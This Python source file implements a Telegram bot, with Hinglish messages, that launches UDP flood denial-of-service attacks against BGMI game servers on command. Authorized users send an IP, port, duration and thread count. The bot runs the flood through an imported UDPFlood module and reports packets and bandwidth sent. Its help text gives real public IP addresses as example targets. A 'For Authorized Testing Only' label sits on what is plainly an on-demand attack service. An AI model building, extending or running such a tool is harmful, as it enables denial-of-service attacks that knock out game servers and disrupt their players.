#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import logging
import sys
import os
import time
from datetime import datetime
from telethon import TelegramClient, events, Button
from colorama import Fore, Style, init

sys.path.append(os.path.dirname(os.path.abspath(__file__)))

import config
from modules.udp_flood import UDPFlood
from modules.utils import AttackUtils

init(autoreset=True)

# Logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

print(AttackUtils.get_banner())

# ✅ Bot object (baad mein start hoga)
bot = TelegramClient(
    os.path.join(config.SESSION_DIR, 'bot'),
    config.API_ID,
    config.API_HASH
)

# ✅ Sirf BGMI UDP Attacker
bgmi_attacker = UDPFlood()
active_attack = None  # Track active attack
attack_start_time = None
attack_config = {}

def is_authorized(user_id):
    return user_id in config.AUTHORIZED_USERS

# ============================================
# ⚔️ /bgmi COMMAND - BGMI ATTACK
# ============================================
@bot.on(events.NewMessage(pattern='/bgmi'))
async def bgmi_attack(event):
    global active_attack, attack_start_time, attack_config
    
    if not is_authorized(event.sender_id):
        await event.reply("❌ **Access Denied!** Aap authorized nahi hain.")
        return
    
    sender_id = event.sender_id
    
    # Check if already attacking
    if active_attack is not None:
        elapsed = time.time() - attack_start_time
        await event.reply(
            f"⚠️ **PEHLE SE ATTACK CHAL RAHA HAI!**\n\n"
            f"🎯 Target: `{attack_config['ip']}:{attack_config['port']}`\n"
            f"⏱️ Chal raha: `{elapsed:.1f}s`\n"
            f"⏱️ Duration: `{attack_config['duration']}s`\n"
            f"🧵 Threads: `{attack_config['threads']}`\n\n"
            f"🛑 Rokne ke liye: `/stop`\n"
            f"📊 Status: `/status`"
        )
        return
    
    # Parse command: /bgmi IP PORT DURATION THREADS
    parts = event.text.split()
    
    if len(parts) < 3:
        await event.reply(
            "⚔️ **BGMI ATTACK COMMAND** ⚔️\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "📝 **Format:**\n"
            "`/bgmi <IP> <PORT> <DURATION> <THREADS>`\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "📊 **Examples:**\n"
            "```\n"
            "/bgmi 157.240.1.1 8080 60 500\n"
            "/bgmi 192.168.1.1 9000 120 1000\n"
            "/bgmi 10.0.0.1 7000 300 800\n"
            "```\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "⚙️ **Parameters:**\n"
            "• IP: Target IP address\n"
            "• Port: 7000-15000 (BGMI range)\n"
            "• Duration: 1-600 seconds\n"
            "• Threads: 1-1000\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🔥 **Quick Attack (Default Port & Settings):**\n"
            "`/bgmi 157.240.1.1`\n"
            f"(Uses Port: {config.TARGET_PORT}, Duration: {config.DEFAULT_DURATION}s, Threads: {config.MAX_THREADS})\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "📋 Menu: `/start`\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        return
    
    # Parse parameters
    target_ip = parts[1]
    target_port = int(parts[2]) if len(parts) > 2 else config.TARGET_PORT
    duration = int(parts[3]) if len(parts) > 3 else config.DEFAULT_DURATION
    threads = int(parts[4]) if len(parts) > 4 else config.MAX_THREADS
    
    # Validate
    if duration < 1 or duration > config.MAX_DURATION:
        await event.reply(f"⚠️ Duration 1-{config.MAX_DURATION} seconds ke beech hona chahiye!")
        return
    
    if threads < 1 or threads > config.MAX_THREADS:
        await event.reply(f"⚠️ Threads 1-{config.MAX_THREADS} ke beech hona chahiye!")
        return
    
    # Save attack config
    attack_config = {
        'ip': target_ip,
        'port': target_port,
        'duration': duration,
        'threads': threads
    }
    
    # 🔥 START ATTACK MESSAGE
    start_msg = await event.reply(
        f"🔥 **BGMI ATTACK STARTED!** 🔥\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 **Target IP:** `{target_ip}`\n"
        f"🔌 **Target Port:** `{target_port}`\n"
        f"⏱️ **Duration:** `{duration}s` ({AttackUtils.format_time(duration)})\n"
        f"🧵 **Threads:** `{threads}`\n"
        f"🔴 **Status:** INITIALIZING...\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"⏳ **Connecting to BGMI server...**\n"
        f"📡 **Sending UDP packets...**\n"
        f"🔄 **Attack in progress...**\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🛑 Stop: `/stop`\n"
        f"📊 Status: `/status`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    
    # Mark as active
    active_attack = True
    attack_start_time = time.time()
    
    try:
        # Run attack in thread pool
        import concurrent.futures
        loop = asyncio.get_event_loop()
        
        with concurrent.futures.ThreadPoolExecutor() as pool:
            report = await loop.run_in_executor(
                pool,
                bgmi_attacker.start_attack,
                target_ip,
                target_port,
                threads,
                duration
            )
        
        # Attack complete
        attack_end_time = time.time()
        total_time = attack_end_time - attack_start_time
        
        elapsed_str = AttackUtils.format_time(report['elapsed'])
        
        # ✅ SUCCESS MESSAGE
        result_msg = (
            f"✅ **BGMI ATTACK COMPLETED!** ✅\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 **ATTACK REPORT**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🎯 **Target:** `{target_ip}:{target_port}`\n"
            f"⏱️ **Duration:** `{elapsed_str}`\n"
            f"🧵 **Threads:** `{threads}`\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📦 **Packets Sent:** `{report['packets']:,}`\n"
            f"📤 **Data Sent:** `{AttackUtils.format_bytes(report['bytes'])}`\n"
            f"🔗 **Connections:** `{report['connections']:,}`\n"
            f"❌ **Errors:** `{report['errors']}`\n"
            f"⚡ **Packet Rate:** `{report['packet_rate']:.2f} pkt/s`\n"
            f"🔗 **Conn Rate:** `{report['conn_rate']:.2f} conn/s`\n"
            f"📶 **Bandwidth:** `{report['mbps']:.2f} Mbps`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🟢 **Status:** SUCCESS ✅\n"
            f"✅ Target successfully tested!\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔄 New Attack: `/bgmi IP PORT DURATION THREADS`\n"
            f"📋 Menu: `/start`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        
        await start_msg.edit(result_msg)
        
        # Log success
        logger.info(
            f"BGMI Attack Completed! Target: {target_ip}:{target_port} | "
            f"Packets: {report['packets']:,} | Duration: {elapsed_str} | "
            f"Bandwidth: {report['mbps']:.2f} Mbps"
        )
        
    except Exception as e:
        # ❌ FAILED MESSAGE
        elapsed = time.time() - attack_start_time
        
        error_msg = (
            f"❌ **BGMI ATTACK FAILED!** ❌\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔴 **Error:** `{str(e)}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🎯 **Target:** `{target_ip}:{target_port}`\n"
            f"⏱️ **Time Elapsed:** `{elapsed:.1f}s`\n"
            f"🧵 **Threads:** `{threads}`\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💡 **Possible Issues:**\n"
            f"• Target unreachable\n"
            f"• Firewall blocking UDP\n"
            f"• Port closed or filtered\n"
            f"• Network connectivity issue\n"
            f"• Invalid IP address\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🔄 Retry: `/bgmi {target_ip} {target_port} {duration} {threads}`\n"
            f"📋 Menu: `/start`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        
        await start_msg.edit(error_msg)
        logger.error(f"BGMI Attack Failed! Target: {target_ip}:{target_port} - Error: {str(e)}")
    
    finally:
        # Clear active attack
        active_attack = None
        attack_start_time = None
        attack_config = {}

# ============================================
# 📊 /status COMMAND
# ============================================
@bot.on(events.NewMessage(pattern='/status'))
async def status_command(event):
    if not is_authorized(event.sender_id):
        return
    
    if active_attack is not None:
        elapsed = time.time() - attack_start_time
        remaining = attack_config['duration'] - elapsed if attack_config else 0
        
        status_msg = (
            f"📊 **ATTACK STATUS** 📊\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🟢 **Status:** ATTACKING 🔥\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🎯 **Target:** `{attack_config['ip']}:{attack_config['port']}`\n"
            f"⏱️ **Elapsed:** `{elapsed:.1f}s`\n"
            f"⏱️ **Remaining:** `{remaining:.1f}s`\n"
            f"⏱️ **Total Duration:** `{attack_config['duration']}s`\n"
            f"🧵 **Threads:** `{attack_config['threads']}`\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🛑 Stop: `/stop`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        await event.reply(status_msg)
    else:
        await event.reply(
            "💤 **NO ACTIVE ATTACK**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "⚔️ Start BGMI Attack:\n"
            "`/bgmi IP PORT DURATION THREADS`\n\n"
            "📋 Example:\n"
            "`/bgmi 157.240.1.1 8080 60 500`\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "📋 Menu: `/start`"
        )

# ============================================
# 🛑 /stop COMMAND
# ============================================
@bot.on(events.NewMessage(pattern='/stop'))
async def stop_command(event):
    global active_attack, attack_start_time, attack_config
    
    if not is_authorized(event.sender_id):
        return
    
    if active_attack is not None:
        elapsed = time.time() - attack_start_time
        
        # Stop attack
        bgmi_attacker.stop_attack()
        
        stop_msg = (
            f"⛔ **ATTACK STOPPED!** ⛔\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🛑 **Status:** STOPPED BY USER\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🎯 **Target:** `{attack_config['ip']}:{attack_config['port']}`\n"
            f"⏱️ **Ran for:** `{elapsed:.1f}s`\n"
            f"⏱️ **Planned:** `{attack_config['duration']}s`\n"
            f"🧵 **Threads:** `{attack_config['threads']}`\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ All connections closed.\n"
            f"✅ Resources freed.\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🔄 New Attack: `/bgmi IP PORT DURATION THREADS`\n"
            f"📋 Menu: `/start`"
        )
        
        # Clear state
        active_attack = None
        attack_start_time = None
        attack_config = {}
        
        await event.reply(stop_msg)
    else:
        await event.reply(
            "💤 **Koi attack active nahi hai!**\n\n"
            "⚔️ Start: `/bgmi IP PORT DURATION THREADS`\n"
            "📋 Menu: `/start`"
        )

# ============================================
# ℹ️ /info COMMAND
# ============================================
@bot.on(events.NewMessage(pattern='/info'))
async def info_command(event):
    if not is_authorized(event.sender_id):
        return
    
    if active_attack is not None:
        elapsed = time.time() - attack_start_time
        status = f"🟢 ATTACKING ({elapsed:.0f}s)"
    else:
        status = "💤 IDLE"
    
    info = (
        f"ℹ️ **BGMI STRESS TESTER INFO** ℹ️\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🤖 **Bot:** BGMI UDP Flood Tester\n"
        f"📌 **Version:** v4.0\n"
        f"📅 **Status:** ✅ Online\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👤 **Your Info:**\n"
        f"• User ID: `{event.sender_id}`\n"
        f"• Status: {status}\n"
        f"• Authorized: ✅ Yes\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 **Default Settings:**\n"
        f"• Port: `{config.TARGET_PORT}`\n"
        f"• Duration: `{config.DEFAULT_DURATION}s`\n"
        f"• Max Threads: `{config.MAX_THREADS}`\n"
        f"• Max Duration: `{config.MAX_DURATION}s`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"⚔️ Attack: `/bgmi IP PORT DURATION THREADS`\n"
        f"📋 Menu: `/start`"
    )
    
    await event.reply(info)

# ============================================
# 📋 /start COMMAND
# ============================================
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    if not is_authorized(event.sender_id):
        await event.reply("❌ **Access Denied!** Aap authorized nahi hain.")
        return
    
    user = event.sender.first_name or "Player"
    
    welcome = (
        f"🔥 **BGMI STRESS TESTER v4.0** 🔥\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👋 **Welcome, {user}!**\n"
        f"✅ **BGMI UDP Attack Ready**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🎯 **Default Target:**\n"
        f"• IP: `{config.TARGET_IP}`\n"
        f"• Port: `{config.TARGET_PORT}`\n"
        f"• Duration: `{config.DEFAULT_DURATION}s`\n"
        f"• Threads: `{config.MAX_THREADS}`\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⚔️ **ATTACK COMMAND:**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"```\n"
        f"/bgmi IP PORT DURATION THREADS\n"
        f"```\n\n"
        f"📊 **Examples:**\n"
        f"```\n"
        f"/bgmi 157.240.1.1 8080 60 500\n"
        f"/bgmi 192.168.1.1 9000 120 1000\n"
        f"/bgmi 10.0.0.1\n"
        f"```\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📋 **Commands:**\n"
        f"• `/bgmi` - Start attack\n"
        f"• `/status` - Check status\n"
        f"• `/stop` - Stop attack\n"
        f"• `/info` - Bot info\n"
        f"• `/start` - This menu\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"⚠️ **For Authorized Testing Only!**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    
    buttons = [
        [Button.inline("🔥 START ATTACK", b"quick_attack")],
        [Button.inline("📊 STATUS", b"status"), 
         Button.inline("⛔ STOP", b"stop")],
        [Button.inline("ℹ️ INFO", b"info"),
         Button.inline("❓ HELP", b"help")]
    ]
    
    await event.reply(welcome, buttons=buttons)

# ============================================
# BUTTON HANDLER
# ============================================
@bot.on(events.CallbackQuery)
async def button_handler(event):
    sender_id = event.sender_id
    if not is_authorized(sender_id):
        await event.answer("❌ Unauthorized!", alert=True)
        return
    
    data = event.data.decode()
    
    if data == "quick_attack":
        if active_attack is not None:
            await event.answer("⚠️ Pehle se attack chal raha hai! /stop karo.", alert=True)
            return
        
        await event.edit(
            "🔥 **Quick Attack** 🔥\n\n"
            "Default settings se attack karne ke liye:\n\n"
            f"🎯 Target: `{config.TARGET_IP}:{config.TARGET_PORT}`\n"
            f"⏱️ Duration: `{config.DEFAULT_DURATION}s`\n"
            f"🧵 Threads: `{config.MAX_THREADS}`\n\n"
            "Copy & send karo:\n"
            f"`/bgmi {config.TARGET_IP} {config.TARGET_PORT} {config.DEFAULT_DURATION} {config.MAX_THREADS}`\n\n"
            "📋 Back: `/start`"
        )
    
    elif data == "stop":
        if active_attack is not None:
            await event.answer("⛔ Attack stop ho raha hai...", alert=True)
            # Trigger stop
            await stop_command(event)
        else:
            await event.answer("💤 Koi attack active nahi!", alert=True)
    
    elif data == "status":
        if active_attack is not None:
            elapsed = time.time() - attack_start_time
            await event.answer(f"🔥 ATTACKING! Elapsed: {elapsed:.0f}s", alert=True)
        else:
            await event.answer("💤 IDLE - No attack running", alert=True)
    
    elif data == "info":
        await event.answer(
            f"BGMI Tester v4.0 | Target: {config.TARGET_IP}:{config.TARGET_PORT}",
            alert=True
        )
    
    elif data == "help":
        await event.edit(
            "❓ **HELP** ❓\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "⚔️ **BGMI Attack Command:**\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "```\n"
            "/bgmi IP PORT DURATION THREADS\n"
            "```\n\n"
            "📊 **Examples:**\n"
            "```\n"
            "/bgmi 157.240.1.1 8080 60 500\n"
            "/bgmi 192.168.1.1 9000 120 1000\n"
            "/bgmi 10.0.0.1 7000 300 800\n"
            "/bgmi 157.240.1.1\n"
            "```\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "📋 **Commands:**\n"
            "• `/bgmi` - Start attack\n"
            "• `/status` - Live status\n"
            "• `/stop` - Stop attack\n"
            "• `/info` - Bot info\n"
            "• `/start` - Main menu\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "⚠️ Authorized testing only!\n\n"
            "📋 Back: `/start`"
        )

# ============================================
# MAIN
# ============================================
async def main():
    # ✅ Bot yahan start karo
    await bot.start(bot_token=config.BOT_TOKEN)
    
    print(f"{Fore.GREEN}[✓] BGMI STRESS TESTER STARTED!{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[+] Default Target: {config.TARGET_IP}:{config.TARGET_PORT}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[+] Duration: {config.DEFAULT_DURATION}s | Threads: {config.MAX_THREADS}{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}[+] Bot Ready - Telegram pe jao!{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] Command: /bgmi IP PORT DURATION THREADS{Style.RESET_ALL}")
    print("-" * 50)
    
    await bot.run_until_disconnected()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Bot stopped by user.{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        logger.error(f"Error: {e}", exc_info=True)
